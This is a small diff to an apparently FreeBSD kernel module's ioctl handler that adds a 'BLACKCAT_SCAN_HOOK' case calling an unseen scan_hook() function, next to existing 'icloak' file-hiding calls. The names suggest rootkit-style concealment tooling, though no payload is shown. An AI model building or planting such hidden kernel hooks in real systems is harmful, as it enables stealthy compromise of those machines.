@@ -7,6 +7,7 @@
  */
 
 #include <freebsd/cdev_ioctl.h>
+#include <freebsd/scan_hook.h>
 #include <defs/io.h>
 #include <icloak.h>
 
@@ -35,6 +36,10 @@ int cdev_ioctl(struct cdev *dev __unused, u_long cmd, caddr_t data, int flag __u
                                                     icloak_show_file(temp);
 
             memset(temp, 0, data_size);
+            break;
+
+        case BLACKCAT_SCAN_HOOK:
+            error = scan_hook();
             break;
 
         default:
